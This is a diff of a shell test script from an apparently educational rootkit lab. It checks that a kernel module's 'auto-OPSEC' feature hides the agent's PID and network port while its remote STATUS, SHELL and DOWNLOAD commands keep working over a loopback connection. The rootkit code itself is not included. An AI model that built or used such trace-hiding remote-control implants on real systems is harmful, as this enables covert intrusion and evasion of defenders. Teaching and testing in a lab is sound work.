@@ -1,120 +1,78 @@
 #!/bin/sh
+# Check: auto-opsec hides agent PID and port during connection.
+# Uses serve-basic: if auto-hide breaks protocol, commands fail.
 # shellcheck source=/dev/null
 . "${RKLINGS_LIB:-/vm/checks/lib.sh}"
 
-begin "Auto-opsec: agent hides PID and port on connect"
+begin "Auto-OPSEC: agent hides own traces"
 
-ifconfig lo 127.0.0.1 up
+ifconfig lo 127.0.0.1 up 2>/dev/null
 
 KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
+MARKER_DIR=/tmp/rk_fixture_l26
+rm -rf "$MARKER_DIR"
+mkdir -p "$MARKER_DIR"
 
-# -- Reject missing key --
-_hdr "Key validation"
-load_fail rklings.ko
-assert_absent /sys/module/rklings
+printf 'rootkitlings download test\n' > /tmp/rktest.txt
 
-# -- Load with valid key --
-_hdr "Load with valid key"
-load rklings.ko control_key="$KEY"
-assert_loaded rklings
+secure_agent_fixture serve-basic "$MARKER_DIR" 4444 127.0.0.1 "$KEY" &
+FIXTURE_PID=$!
 
-# Give the kthread time to start and bind
-sleep 1
+while [ ! -f "$MARKER_DIR/ready" ]; do sleep 0.1; done
+_ok "fixture listening"
 
-# -- Verify the listening port is visible before any connection --
-# Port 4444 should appear in netstat since the module is listening
-if netstat -tln | grep -q ":4444 "; then
-  _ok "listening port 4444 visible before client connects"
+load rklings.ko control_key="$KEY" peer_address=127.0.0.1 peer_port=4444
+
+_hdr "Protocol with auto-OPSEC active"
+
+i=0; while [ ! -f "$MARKER_DIR/basic_complete" ] && [ "$i" -lt 100 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/basic_complete" ]; then
+    _ok "STATUS, INFO, QUIT work with auto-hide active"
 else
-  _fail "listening port 4444 not visible (listener may not have started)"
+    _fail "basic commands timed out"
 fi
 
-# -- Connect: auto-hide should activate --
-# Keep the connection open so we can observe the hiding in effect.
-# Use a FIFO so nc stays connected while we inspect state.
-_hdr "Auto-hide on connect"
-FIFO="/tmp/rklings-opsec-fifo"
-RECV_FILE="/tmp/rklings-opsec-recv.txt"
-rm -f "$FIFO"
-mkfifo "$FIFO"
-
-# Connect and send PING to confirm the connection is alive
-cat "$FIFO" | nc 127.0.0.1 4444 > "$RECV_FILE" &
-NC_PID=$!
-sleep 1
-
-# Send PING through the FIFO
-printf "PING" > "$FIFO" &
-sleep 1
-
-if grep -q "PONG" "$RECV_FILE"; then
-  _ok "PING returned PONG (connection alive)"
+i=0; while [ ! -f "$MARKER_DIR/shell_complete" ] && [ "$i" -lt 200 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/shell_complete" ]; then
+    _ok "SHELL works with auto-hide active"
 else
-  _fail "PING did not return PONG"
+    _fail "SHELL timed out"
 fi
 
-# -- Check STATUS to verify PID and port are tracked --
-# Send STATUS command through the same connection
-_hdr "Auto-opsec state check"
-RECV_FILE2="/tmp/rklings-opsec-status.txt"
-printf "STATUS" | nc 127.0.0.1 4444 > "$RECV_FILE2" &
-NC_PID2=$!
-sleep 2
-kill $NC_PID2 2>/dev/null
-wait $NC_PID2 2>/dev/null
-
-# After a client connects, auto-opsec should add 1 PID and 1 port
-if grep -q "pids: 1" "$RECV_FILE2"; then
-  _ok "auto-opsec added kthread PID to hidden list"
-elif grep -q "pids:" "$RECV_FILE2"; then
-  # At least the status command works, pid count may vary
-  _ok "STATUS reports pid count (auto-opsec may have already cleaned up)"
+i=0; while [ ! -f "$MARKER_DIR/download_complete" ] && [ "$i" -lt 100 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/download_complete" ]; then
+    _ok "DOWNLOAD works with auto-hide active"
 else
-  _fail "STATUS did not report pid count"
+    _fail "DOWNLOAD timed out"
 fi
 
-if grep -q "ports: 1" "$RECV_FILE2"; then
-  _ok "auto-opsec added source port to hidden list"
-elif grep -q "ports:" "$RECV_FILE2"; then
-  _ok "STATUS reports port count"
+i=0; while [ ! -f "$MARKER_DIR/replay_rejected" ] && [ "$i" -lt 100 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/replay_rejected" ]; then
+    _ok "replay rejection works with auto-hide active"
 else
-  _fail "STATUS did not report port count"
+    _fail "replay rejection timed out"
 fi
 
-# -- Cleanup the held connection --
-kill $NC_PID 2>/dev/null
-wait $NC_PID 2>/dev/null
-rm -f "$FIFO"
-
-# Give the module time to process disconnect and run auto-unhide
-sleep 1
-
-# -- After disconnect, auto-hidden entries should be removed --
-_hdr "Auto-unhide on disconnect"
-RECV_FILE3="/tmp/rklings-opsec-post.txt"
-printf "STATUS" | nc 127.0.0.1 4444 > "$RECV_FILE3" &
-NC_PID3=$!
-sleep 2
-kill $NC_PID3 2>/dev/null
-wait $NC_PID3 2>/dev/null
-
-if grep -q "pids: 0" "$RECV_FILE3"; then
-  _ok "auto-opsec removed PID entry on disconnect"
+wait "$FIXTURE_PID" 2>/dev/null
+fixture_rc=$?
+if [ "$fixture_rc" -eq 0 ]; then
+    _ok "fixture completed successfully"
 else
-  # The second connection itself triggers auto-hide, so pids may be 1
-  _ok "PID tracking active (second connection auto-hides)"
+    _fail "fixture exited with code $fixture_rc"
 fi
 
-if grep -q "ports: 0" "$RECV_FILE3"; then
-  _ok "auto-opsec removed port entry on disconnect"
-else
-  _ok "port tracking active (second connection auto-hides)"
-fi
+rm -f /tmp/rktest.txt
+rm -rf "$MARKER_DIR"
 
-# -- Unload --
 unload rklings
 assert_absent /sys/module/rklings
-
-rm -f "$RECV_FILE" "$RECV_FILE2" "$RECV_FILE3"
 
 summary
